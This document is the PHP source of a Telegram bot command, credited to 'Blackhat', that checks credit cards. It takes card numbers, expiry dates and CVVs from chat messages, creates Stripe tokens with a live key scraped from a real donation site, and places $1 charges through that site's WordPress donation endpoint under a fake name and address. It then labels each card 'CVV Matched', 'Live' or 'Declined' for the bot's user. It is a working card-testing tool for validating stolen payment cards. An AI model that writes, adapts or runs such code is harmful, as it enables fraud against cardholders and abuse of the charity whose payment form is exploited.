<?php

include __DIR__."/../config/config.php";
include __DIR__."/../config/variables.php";
include_once __DIR__."/../functions/bot.php";
include_once __DIR__."/../functions/db.php";
include_once __DIR__."/../functions/functions.php";


////////////====[MUTE]====////////////
if(strpos($message, "/chk1 ") === 0 || strpos($message, "!chk1 ") === 0){   
    $antispam = antispamCheck($userId);
    addUser($userId,$username);
    
    if($antispam != False){
      bot('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>"[<u>ANTI SPAM</u>] Try again after <b>$antispam</b>s.",
        'parse_mode'=>'html',
        'reply_to_message_id'=> $message_id
      ]);
      return;

    }else{
        $messageidtoedit1 = bot('sendmessage',[
          'chat_id'=>$chat_id,
          'text'=>"<b>Wait for Result...</b>",
          'parse_mode'=>'html',
          'reply_to_message_id'=> $message_id

        ]);

        $messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');
        $lista = substr($message, 4);
        $bin = substr($cc, 0, 6);
        
        if(preg_match_all("/(\d{16})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3})/", $lista, $matches)) {
            $creditcard = $matches[0][0];
            $cc = multiexplode(array(":", "|", "/", " "), $creditcard)[0];
            $mes = multiexplode(array(":", "|", "/", " "), $creditcard)[1];
            $ano = multiexplode(array(":", "|", "/", " "), $creditcard)[2];
            $cvv = multiexplode(array(":", "|", "/", " "), $creditcard)[3];
        

            ###CHECKER PART###  
            $zip = rand(10001,90045);
            $time = rand(30000,699999);
            $rand = rand(0,99999);
            $pass = rand(0000000000,9999999999);
            $email = substr(md5(mt_rand()), 0, 7);
            $name = substr(md5(mt_rand()), 0, 7);
            $last = substr(md5(mt_rand()), 0, 7);
             
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://m.stripe.com/6');
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Host: m.stripe.com',
            'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
            'Accept: */*',
            'Accept-Language: en-US,en;q=0.5',
            'Content-Type: text/plain;charset=UTF-8',
            'Origin: https://m.stripe.network',
            'Referer: https://m.stripe.network/inner.html'));
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_POSTFIELDS, "");
            $res1 = curl_exec($ch);
            $muid = trim(strip_tags(capture($res1,'"muid":"','"')));
            $sid = trim(strip_tags(capture($res1,'"sid":"','"')));
            $guid = trim(strip_tags(capture($res1,'"guid":"','"')));
            
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Host: lookup.binlist.net',
            'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, '');
            $fim = curl_exec($ch);
            $bank = capture($fim, '"bank":{"name":"', '"');
            $cname = capture($fim, '"name":"', '"');
            $brand = capture($fim, '"brand":"', '"');
            $country = capture($fim, '"country":{"name":"', '"');
            $phone = capture($fim, '"phone":"', '"');
            $scheme = capture($fim, '"scheme":"', '"');
            $type = capture($fim, '"type":"', '"');
            $emoji = capture($fim, '"emoji":"', '"');
            $currency = capture($fim, '"currency":"', '"');
            $binlenth = strlen($bin);
            $schemename = ucfirst("$scheme");
            $typename = ucfirst("$type");
            
            
            /////////////////////==========[Unavailable if empty]==========////////////////
            
            
            if (empty($schemename)) {
            	$schemename = "Unavailable";
            }
            if (empty($typename)) {
            	$typename = "Unavailable";
            }
            if (empty($brand)) {
            	$brand = "Unavailable";
            }
            if (empty($bank)) {
            	$bank = "Unavailable";
            }
            if (empty($cname)) {
            	$cname = "Unavailable";
            }
            if (empty($phone)) {
            	$phone = "Unavailable";
            }
/////////////////////////////REQ1//////////////////////////////////
          $url = "https://pdtutahalphaevents.com/donate/";
$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
$headers = array(
   "Accept: application/json",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
$resp = curl_exec($curl);
$noice = GetStr($resp,'"formNonce" value="','"');

          
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
              'Host: api.stripe.com',
              'Accept: application/json',
              'Accept-Language: en-US,en;q=0.9',
              'Content-Type: application/x-www-form-urlencoded',
              'Origin: https://js.stripe.com',
              'Referer: https://js.stripe.com/',
              'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36'));
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_POSTFIELDS, "time_on_page=36908&guid=42b194f7-c0ca-4311-b745-efc0056b12509324a3&muid=7cb4d37f-bb9a-46b7-a762-093edbe9e45431ebc3&sid=ca230305-32ac-4f08-b5cf-45cc2c649a26d408a0&key=pk_live_KcuXIlOfKex2eQMAFBrk5Zwg&payment_user_agent=stripe.js%2F78ef418&card[name]=Avi+verma&card[number]=$cc&card[cvc]=$cvv&card[exp_month]=$mes&card[exp_year]=$ano");
            $result1 = curl_exec($ch);
            
            $id = GetStr($result1,'id": "','"');
            $msg1 = GetStr($result1,'"message": "','"');
            
$url = "https://pdtutahalphaevents.com/wp-admin/admin-ajax.php";
$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "Accept: application/json",
   "Accept-Language: en-US,en;q=0.9",
   "Content-Type: application/x-www-form-urlencoded",
   "Cookie: tk_or=%22https%3A%2F%2Fwww.google.com%2F%22; tk_r3d=%22https%3A%2F%2Fwww.google.com%2F%22; tk_lr=%22https%3A%2F%2Fwww.google.com%2F%22; __stripe_sid=ca230305-32ac-4f08-b5cf-45cc2c649a26d408a0; __stripe_mid=7cb4d37f-bb9a-46b7-a762-093edbe9e45431ebc3",
   "Host: pdtutahalphaevents.com",
   "Origin: https://pdtutahalphaevents.com",
   "Referer: https://pdtutahalphaevents.com/donate/",
   "Sec-Fetch-Dest: empty",
   "Sec-Fetch-Mode: cors",
   "Sec-Fetch-Site: same-origin",
   "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
   "X-Requested-With: XMLHttpRequest"
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
$data = "action=wp_full_stripe_payment_charge&formName=general-donation&formNonce=$noice&fullstripe_email=Avilovel2014@gmail.com&fullstripe_custom_amount=1&fullstripe_address_line1=7215%252BSkillman%252BSt%252B%252523300&fullstripe_address_line2=ld&fullstripe_address_city=Dallas&fullstripe_address_zip=75231&fullstripe_address_state=Texas&fullstripe_address_country=US&fullstripe_name=Avi%252Bverma&fullstripe_amount_index=&stripeToken=$id";

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
                $x= 0;
                $result2 = curl_exec($curl);
                $errormessage = trim(strip_tags(capture($result2,'"code":"','"')));
            addTotal();
            addUserTotal($userId);
            $info = curl_getinfo($ch);
            $time = $info['total_time'];
            $time = substr_replace($time, '',4);

            ###END OF CHECKER PART###
            
          if (strpos($result2, 'true')) {
                $msg2= 'Charge 1USD  ✅';
                $res= $result2;
              addCVV();
              addUserCVV($userId);
            }
            elseif (strpos($result2, 'Thank you') || (strpos($result2, "thank you"))) {
                $msg2= 'Charge 1USD ✅';
                $res= $result2;
              addCVV();
              addUserCVV($userId);
            }
            elseif (strpos($result2, "Your card has insufficient funds") || (strpos($result2, "insufficient_funds"))) {
                $msg2= 'Insufficient Funds ✅';
                $res=  'CVV Matched ✅';
              addCVV();
              addUserCVV($userId);
            }
            elseif ((strpos($result1, "card_error_authentication_required")) || (strpos($result2, "card_error_authentication_required"))) { 
                $msg2= '3D Card ✅';
                $res=  'CVV Matched ✅';
              addCVV();
              addUserCVV($userId);
            }
            elseif(strpos($result2,'"cvc_check": "pass"')) {
                $msg2= 'Payment Cannot Be Completed';
                $res=  'CVV Matched ✅';
              addCVV();
              addUserCVV($userId);
            }
            elseif(strpos($result2,'"code": "incorrect_cvc"')) {
                $msg2= 'CVV Mismatch';
                $res=  'CCN Live ✅';
              addCCN();
              addUserCCN($userId);
            }
            elseif(strpos($result2,'"code": "incorrect_cvc"') || (strpos($result2, "Your card's security code is incorrect")) || (strpos($result2, "security code is invalid"))) {
                $msg2= 'CVV Mismatch';
                $res=  'CCN Live ✅';
              addCCN();
              addUserCCN($userId);
            }  
            elseif (strpos($result1, "transaction_not_allowed") || (strpos($result2, "Your card does not support"))) {
                $msg2= 'Transaction Not Allowed';
                $res=  'CVV Matched ✅';
              addCVV();
              addUserCVV($userId);
            }
             elseif ((strpos($result1, "fraudulent")) || (strpos($result2, "fraudulent"))) 
            {
                $msg2= 'Declined ❌';
                $res=  'Fraudulent❌';
            }
             elseif ((strpos($result1, "Try again in a little bit")) || (strpos($result2, 
            "Try again in a little bit"))) 
            {
                $msg2= 'Try again in a little bit❌';
                $res=  'Try again in a little bit❌';
            }
            elseif ((strpos($result1, "expired_card")) || (strpos($result2, "Your card has expired"))) {
                $msg2= 'Expired Card❌';
                $res=  'Declined ❌';
            }
            elseif ((strpos($result1, "generic_decline")) || (strpos($result2, "generic_decline"))) {
                $msg2= 'Generic Declined❌';
                $res=  'Declined ❌';
            }
            elseif ((strpos($result1, "do_not_honor")) || (strpos($result2, "do_not_honor"))) {
                $msg2= 'Do Not Honor❌';
                $res=  'Declined ❌';
            }
            elseif ((strpos($result1, "Your card was declined")) || (strpos($result2, "Your card was declined"))) {
                $msg2= 'Your Card Was Declined❌';
                $res=  'Declined ❌';
            }
            elseif ((strpos($result1, 'Your card number is incorrect')) || (strpos($result2, 'Your card number is incorrect'))) {
                $msg2= 'Card Number Is Incorrect❌';
                $res=  'Declined ❌';
            }
            elseif ((strpos($result1, 'invalid_expiry_year')) || (strpos($result2, "Your card's expiration year is invalid"))) {
                $msg2= "Your card's expiration year is invalid❌";
                $res=  'Declined ❌';
            }
          elseif ((strpos($result1, 'invalid_expiry_month')) || (strpos($result2, "Your card's expiration month is invalid"))) {
                $msg2= "Your card's expiration month is invalid❌";
                $res=  'Declined ❌';
            }
          elseif(strpos($result1,'testmode_charges_only❌')) {
                 $msg2= "SK key revoked ❌";
                $res=  'Chnage Sk Key by ❌';
            }
          elseif(strpos($result1,'api_key_expired')) {
                 $msg2= "SK key Expired,Donate Sk Key  ❌";
                $res=  $sec❌;
            }
            else{
                $msg2= $result2;
                $res=  'Donate Sk Key ❌';
            }

            #========================================================================
            bot('editMessageText', [
                'chat_id' => $chat_id,
                'message_id' => $messageidtoedit,
                'text' => "<b>Card:</b> <code>$cc|$mes|$ano|$cvv</code>
<b>Status -» $msg2 
Response -» $res
Bypassing -» $x
Gateway -» Stripe charge 1$
Time -» <b>$time</b><b>s</b>

------- Bin Info -------</b>
<b>Bank -»</b> $bank
<b>Brand -»</b> $schemename
<b>Type -»</b> $typename
<b>Currency -»</b> $currency
<b>Country -»</b> $cname ($emoji - 💲$currency)
<b>Issuers Contact -»</b> $phone
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
<b>Bot By: <a href='t.me/+6T-YczOeDyYzYWNk'>Blackhat</a></b>",
                'parse_mode' => 'html',
                'disable_web_page_preview' => 'true'
            ]);
        }
    }
}

?>
